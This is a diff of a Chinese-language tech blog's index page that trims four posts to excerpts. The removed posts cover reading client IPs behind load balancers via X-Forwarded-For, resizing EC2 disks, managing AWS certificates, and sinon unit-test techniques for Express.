@@ -153,65 +153,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <h2><span id="前言">前言</span></h2>
-<p>我們有時候要取得使用者 IP<br>
-往往都會用最簡單的方式取得 IP<br>
-以 express 為例子，會使用 <code>req.connection.remoteAddress</code> <code>req.ip</code> 等等方式取得 IP<br>
-但你知道，當伺服器被多層的 Load Balancer 保護在前面的時候<br>
-取得到的 IP 會是 Load Balancer 的嗎?<br>
-而真正的 IP 會被 Load Balancer 放在 <code>X-Forwarded-For</code> 上面，傳遞到後面伺服器<br>
-如果不知道的話，那這邊文章有可能會幫助到你</p>
-<p>&lt;!-- more --&gt;</p>
-<p>接下來會以 AWS 的 Load Balancer 以及伺服器上建立一個 Nginx 服務<br>
-然後還有一個 express server 服務來說明<br>
-從無 Load Balancer 到雙層 Load Balancer 的架構下分別該如何取得 IP</p>
-<h2><span id="direct-connection">Direct Connection</span></h2>
-<p>架構示意圖如下<br>
-<img src="/images/aws/aws-get-ip-01-arch.png" alt></p>
-<p>當我們連線時直接連到伺服器時
-可以透過 express 的 <code>req.connection.remoteAddress</code> 取得到使用者的 IP (233.x.x.x)<br>
-原因是此時的呼叫者是使用者</p>
-<p><img src="/images/aws/aws-get-ip-01.png" alt></p>
-<h2><span id="單層-load-balancer">單層 Load Balancer</span></h2>
-<p>架構示意圖如下<br>
-<img src="/images/aws/aws-get-ip-02-arch.png" alt></p>
-<p>當我們遇到只有一層 Load Balancer 時<br>
-透過 express 的 <code>req.connection.remoteAddress</code> 會取得到的
-是 Load Balancer 的 IP (10.x.x.x, 圖中最下面)<br>
-原因是 Load Balancer 作為中介者，取得到了 Rqeuest 之後<br>
-會再往後端伺服器轉發，這時候呼叫者就是 Load Balancer 而不會是使用者<br>
-使用者真正的 IP 是會放在 header 的 <code>X-Forwarded-For</code> 上面 (233.x.x.x)</p>
-<blockquote>
-<p>這邊 Load Balancer 可以是 Nginx，但這邊我們用 AWS Load Balancer 做 DEMO<br>
-原因是我們後面會需要架構出兩層 Load Balancer 的狀況</p>
-</blockquote>
-<p><img src="/images/aws/aws-get-ip-02.png" alt></p>
-<h2><span id="雙層-load-balancer">雙層 Load Balancer</span></h2>
-<p>架構示意圖如下<br>
-<img src="/images/aws/aws-get-ip-03-arch.png" alt></p>
-<p>而當我們再加上一層 Load Balancer 的時候 (這裡用 nginx 代替)<br>
-透過 express 的 <code>req.connection.remoteAddress</code> 會取得到的是 Nginx 的 IP<br>
-因為呼叫者從上一個案例的 Load Balancer 變成了 Nginx<br>
-而我們這邊 Nginx 是架設在 localhost 裡面，所以可以看到 IP 是 127.0.0.1 (圖中最下面)<br>
-那前面 Load balancer 的 IP 就被放到 X-Forwarded-For 上面去了 (10.x.x.x 那個)</p>
-<p><img src="/images/aws/aws-get-ip-03.png" alt></p>
-<h2><span id="雙層-load-balancer-惡意-x-forwarded-for">雙層 Load Balancer + 惡意 X-Forwarded-For</span></h2>
-<p>架構示意圖如下<br>
-<img src="/images/aws/aws-get-ip-04-arch.png" alt></p>
-<p>狀況如同前面的 Case，但這邊唯一不一樣的是<br>
-萬一使用者自己在 X-Forwarded-For 加了 <code>X-Forwarded-For: 5.5.5.5, 6.6.6.6</code><br>
-這些資料是會被放到 X-Forwarded-For 最前面去的<br>
-所以在取得 IP 的時候要特別注意並不是取得 X-Forwarded-For 的第一個就可以了<br>
-應該要根據你前面放了多少個 Load Balancer 去決定要拿<strong><em>從後面數過來的第幾個</em></strong>才是正確的</p>
-<p><img src="/images/aws/aws-get-ip-04.png" alt></p>
-<h2><span id="references">References</span></h2>
-<p>其他還有很多詳細的介紹，非常推薦看以下這篇文章，大推！</p>
-<ol>
-<li>https://devco.re/blog/2014/06/19/client-ip-detection/</li>
-</ol>
-
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我們有時候要取得使用者 IP<br>往往都會用最簡單的方式取得 IP<br>以 express 為例子，會使用 <code>req.connection.remoteAddress</code> <code>req.ip</code> 等等方式取得 IP<br>但你知道，當伺服器被多層的 Load Balancer 保護在前面的時候<br>取得到的 IP 會是 Load Balancer 的嗎?<br>而真正的 IP 會被 Load Balancer 放在 <code>X-Forwarded-For</code> 上面，傳遞到後面伺服器<br>如果不知道的話，那這邊文章有可能會幫助到你  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2020/01/09/express-get-client-ip-from-load-balancer/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -255,36 +207,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <h2><span id="前言">前言</span></h2>
-<p>在使用 AWS 服務時，有時候會因為 log 量太大導致硬碟大小不夠<br>
-此時會需要把硬碟增加大小，以免整台機器爆掉<br>
-接下來會針對如何增加硬碟大小做說明</p>
-<p>&lt;!-- more --&gt;</p>
-<h2><span id="確認硬碟大小方法">確認硬碟大小方法</span></h2>
-<p>可以透過 <code>df -h .</code> 指令確認硬碟目前使用的大小<br>
-這時候可以看到硬碟配置的大小<br>
-<img src="/images/aws/aws-ec2-disk-01.png" alt></p>
-<p>接下來可以透過 <code>lsblk</code> 回找最大上限的配置可以是多少
-上面 xvda 就是最多可以有多少大小
-下面 xvda1 就是實際上目前有多少大小
-<img src="/images/aws/aws-ec2-disk-02.png" alt></p>
-<p>看另一個例子，以下圖的 xvdi 和 xvdi1 來說<br>
-可配置最大上限為 8G，但目前正在使用的最大上限為 1023 MB<br>
-<img src="/images/aws/aws-ec2-disk-03.png" alt></p>
-<h2><span id="增加硬碟大小">增加硬碟大小</span></h2>
-<p>到 EC2 的頁面點選要更新的 EC2，點選右下角 disk<br>
-<img src="/images/aws/aws-ec2-disk-04.png" alt></p>
-<p>點進去之後，就進入到另一個頁面，點選 Action &gt; Modify，會看到以下頁面，就可以增加大小了<br>
-<img src="/images/aws/aws-ec2-disk-05.png" alt></p>
-<p>接下來要到 EC2 裡面把實際上使用的大小擴充到可配置的最大空間<br>
-以剛剛的 xvdi 為例的話，需要執行以下兩個指令才可以擴充
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo growpart &#x2F;dev&#x2F;xvdi 1</span><br><span class="line">sudo resize2fs &#x2F;dev&#x2F;xvdi1</span><br></pre></td></tr></table></figure>
-這樣大小會直接擴充至可配置的最大上限，如果不想要配置到最大的話<br>
-可以在後面加上幾 G 去做限制，如下
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 擇一</span><br><span class="line">sudo resize2fs &#x2F;dev&#x2F;xvdi1 2G</span><br><span class="line">sudo resize2fs &#x2F;dev&#x2F;xvdi1 2048M</span><br></pre></td></tr></table></figure></p>
-
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在使用 AWS 服務時，有時候會因為 log 量太大導致硬碟大小不夠<br>此時會需要把硬碟增加大小，以免整台機器爆掉<br>接下來會針對如何增加硬碟大小做說明  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2020/01/06/aws-increase-disk-space-in-ec2/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -328,34 +261,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <h2><span id="前言">前言</span></h2>
-<p>AWS 有提供一套服務可以把申請好的憑證一次給多個服務使用<br>
-掛載在上面的憑證可以給 load balanacer, cloudfront 等等使用</p>
-<p>&lt;!-- more --&gt;</p>
-<p>以 load balancer 來說<br>
-外面 https:443 進來後，要導入到 http:8080 的服務<br>
-就會需要把憑證解開，然後進一步把流量往裡面送<br>
-所以在 load balancer 上面就一定要掛載 private/public key 才有辦法去解開進來的流量<br>
-像是在選 load balancer 的頁面，選擇 port forwarding 的時候就會需要選擇要掛載哪一個 certificate<br>
-<img src="/images/aws/aws-acm-01.png" alt></p>
-<p>而在 cloudfront 的時候<br>
-在申請的同時也會需要填入要用哪一組憑證 (Customer Certificate)<br>
-<img src="/images/aws/aws-acm-04.png" alt></p>
-<p>當選入憑證的時候，Cloudfront 配給你的 domain 是 xxxxx.cloudfront.net 這種<br>
-但憑證假設安裝的事 api.example.com 這種，會導致不安全的提示出現<br>
-此時會需要到網域註冊商，把 CNAME api 指到 xxxxx.cloudfront.net<br>
-到時候瀏覽 api.exmaple.com 就會出現合法的憑證了</p>
-<h2><span id="如何更新憑證">如何更新憑證</span></h2>
-<p>首先要進入到 AWS 的 Certificate Manager 頁面，並且點選你想要 Reimport 的憑證<br>
-右上角會有一個藍色的『Reimport Certificate』按鈕，點選下去會到一個輸入頁面<br>
-<img src="/images/aws/aws-acm-02.png" alt></p>
-<p>到了輸入頁面會看到有 Certificate Body, Certificate Private Key, Certificate Chain<br>
-接下來就把跟網域註冊商申請到的憑證一個一個貼上去即可，注意這裡要是 PEM 格式<br>
-<img src="/images/aws/aws-acm-03.png" alt></p>
-<p>其實在新增憑證的時候，也是一模一樣的流程</p>
-
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>AWS 有提供一套服務可以把申請好的憑證一次給多個服務使用<br>掛載在上面的憑證可以給 load balanacer, cloudfront 等等使用  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2020/01/06/aws-certificate-manager/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -399,120 +315,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <h2><span id="前言">前言</span></h2>
-<p><a href="https://yu-jack.github.io/2019/12/10/unit-test-express/">上一篇</a>我們講到使用 sinon 搭配 express 的使用基礎<br>
-今天會介紹的是關於在 express 上<br>
-實作 unit test 的幾個技巧以及可能會遇到的問題<br>
-該如何解決問題，並依靠 sinon 去達到希望的功效</p>
-<p>&lt;!-- more --&gt;</p>
-<h2><span id="stub-同一個-object">stub 同一個 object</span></h2>
-<p>在開始寫 unit test 之後<br>
-會開始發現一件事情，就是需要對同一個物件重複做 stub<br>
-在 a.test.js 需要 stub 一次<br>
-在 b.test.js 又需要 stub 一次</p>
-<p>直覺上測試程式可能會變成以下的樣子<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// login.test.js</span></span><br><span class="line"><span class="keyword">const</span> apiServiceStub = sinon.stub(apiService);</span><br><span class="line">describe(<span class="string">"[登入功能]"</span>, () =&gt; &#123;</span><br><span class="line">    it(<span class="string">"登入成功"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceStub.login.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> loginController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"登入錯誤"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceStub.login.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">-1</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> loginController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入失敗"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// register.test.js</span></span><br><span class="line"><span class="keyword">const</span> apiServiceStub = sinon.stub(apiService);</span><br><span class="line">describe(<span class="string">"[註冊功能]"</span>, () =&gt; &#123;</span><br><span class="line">    it(<span class="string">"註冊成功"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceStub.register.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> registerController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"註冊成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"註冊錯誤"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceStub.register.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">-1</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> registerController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"註冊失敗"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>我們在 login.test.js 以及 register.test.js<br>
-都對 apiServer 進行 stub 的動作<br>
-而這兩個檔案在獨立分別跑測試的時候是會成功的<br>
-但一起執行的時候卻會爆出以下的錯誤<br>
-<code>TypeError: Attempted to wrap which is already wrapped</code><br>
-代表說，我們對同一個 object 重複做了 wrap<br>
-<img src="/images/unit-test/problem-1.png" alt></p>
-<blockquote>
-<p>可到個人的 <a href="https://github.com/Yu-Jack/unit-test-practice">github 下載程式</a>，並執行 <code>npm run w1</code><br>
-就可以看到錯誤訊息了</p>
-</blockquote>
-<p>要解決這個問題的話<br>
-我們必須透過 stub 指定的 method<br>
-再加上透過 restore 的方式釋放被 wrapped 物件的方法<br>
-如果不 restore 的話，物件就會一直是 wrappred 的狀態<br>
-然後就一直沒有辦法回復到原本物件應該有的狀態<br>
-所以更改過後程式碼如下
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// login.test.js</span></span><br><span class="line"><span class="keyword">let</span> apiServiceLogin</span><br><span class="line">describe(<span class="string">"[登入功能]"</span>, () =&gt; &#123;</span><br><span class="line">    before(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        apiServiceLogin = sinon.stub(apiService, <span class="string">"login"</span>);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    after(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        apiServiceLogin.restore();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    it(<span class="string">"登入成功"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> loginController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"登入錯誤"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceLogin.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">-1</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> loginController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"登入失敗"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// register.test.js</span></span><br><span class="line"><span class="keyword">let</span> apiServiceRegisterStub;</span><br><span class="line">describe(<span class="string">"[註冊功能]"</span>, () =&gt; &#123;</span><br><span class="line">    before(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        apiServiceRegisterStub = sinon.stub(apiService, <span class="string">"register"</span>);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    after(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        apiServiceRegisterStub.restore();</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"註冊成功"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceRegisterStub.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">0</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> registerController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"註冊成功"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">    it(<span class="string">"註冊錯誤"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> req = mockRequest(&#123;</span><br><span class="line">            username: <span class="string">"123"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">const</span> res = mockResponse();</span><br><span class="line">        apiServiceRegisterStub.withArgs(<span class="string">"123"</span>).resolves(&#123;</span><br><span class="line">            status: <span class="number">-1</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> registerController.run(req, res)</span><br><span class="line">        sinon.assert.calledWith(res.json, &#123;</span><br><span class="line">            message: <span class="string">"註冊失敗"</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        sinon.assert.calledOnce(res.json);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>主要著手解決的地方在於兩點</p>
-<ol>
-<li><code>before</code> -&gt; 把 stub 的地方改放這 (不過個人實驗過，不放這也沒問題，放這只是比較有統一性)</li>
-<li><code>after</code> -&gt; 加上 <code>restore</code>，在做完測試的時候把整個物件給釋放出來
-這點如果沒有做到的話，會導致在另一個 xxx.test.js 在使用同一個物件的方法時<br>
-爆出已經被 wrapped 過後的錯誤訊息</li>
-</ol>
-<blockquote>
-<p>可在<a href="https://github.com/Yu-Jack/unit-test-practice">個人專案</a>下執行 <code>npm run w2</code> 即可看到錯誤訊息
-裡面的範例是把 login.test.js restore 給註解掉後
-故意讓 register.test.js 去對 login 做 stub 而不是 register
-此時因為 login.test.js 做過一次 stub
-register.test.js 再做一次 stub 就會出現錯誤了
-成功的結果可以執行 <code>npm run c1</code>  看到</p>
-</blockquote>
-<h2><span id="檢測-api-uri">檢測 API URI</span></h2>
-<p>透過 <code>sinon.stub</code> 的 <code>withArgs</code> 功能可以確定<br>
-當我們程式在執行的時候，所呼叫的 api URI 是否正確<br>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">axiosPostStub.withArgs(<span class="string">"http://localhost:7070/api/login"</span>, data).resolves(&#123;</span><br><span class="line">    status: <span class="number">0</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-當程式呼叫錯誤的 API URI 的時候<br>
-就不會回傳我們預設給的回傳值<br>
-就會導致程式後續失敗，這就是反向驗證了我們 API URI 是否正確的方式</p>
-<blockquote>
-<p>可在個人專案下執行 <code>npm run c2</code> 即可看到結果</p>
-</blockquote>
-<h2><span id="驗證-axios-的攔截器">驗證 axios 的攔截器</span></h2>
-<p>有時候我們會為 axios 加上攔截功能<br>
-但如果要測試攔截功能，就又必須要有 server 才能辦到<br>
-此時可以在 test case 裡面加上 <code>http.createServer</code> 做到這件事情
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// network.js</span></span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">"axios"</span>);</span><br><span class="line"></span><br><span class="line">axios.interceptors.request.use(<span class="function">(<span class="params">config</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="string">"do something for request"</span>));</span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">axios.interceptors.response.use(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="string">"do something for response"</span>));</span><br><span class="line">    <span class="keyword">return</span> response.data;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = axios;</span><br><span class="line"></span><br><span class="line"><span class="comment">// network.test.js</span></span><br><span class="line"><span class="keyword">let</span> server;</span><br><span class="line">describe(<span class="string">"[network 功能]"</span>, () =&gt; &#123;</span><br><span class="line">    afterEach(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        server.close();</span><br><span class="line">        server = <span class="literal">null</span>;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    it(<span class="string">"測試攔截功能(interceptors)"</span>, (done) =&gt; &#123;</span><br><span class="line">        server = http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> data = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;</span><br><span class="line">            res.end(<span class="built_in">JSON</span>.stringify(data));</span><br><span class="line">        &#125;).listen(<span class="number">4000</span>, () =&gt; &#123;</span><br><span class="line">            network.post(<span class="string">"http://localhost:4000"</span>).then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">                done();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>配置好以上程式之後，可以在 terminal 看到兩個 console.log 的訊息<br>
-這就代表我們的攔截器有被執行到<br>
-個人認為攔截器測試獨立寫出來一個就可以<br>
-不用特地讓其他測試案例都一定要執行到這功能，不然就不叫 unit test 了</p>
-<blockquote>
-<p>可在<a href="https://github.com/Yu-Jack/unit-test-practice">個人專案</a>下執行 <code>npm run c3</code> 即可看到結果</p>
-</blockquote>
-<h2><span id="測試-callback-function">測試 callback function</span></h2>
-<p>有些時候我們會需要把一些在用 callback function 的程式<br>
-包起來改用 Promise 的方法使用，如下
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span>(<span class="params">data, callback</span>) </span>&#123;</span><br><span class="line">        callback(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> test = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        obj.test(<span class="string">"qqqq"</span>, (data) =&gt; &#123;</span><br><span class="line">            res(data)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> test();</span><br><span 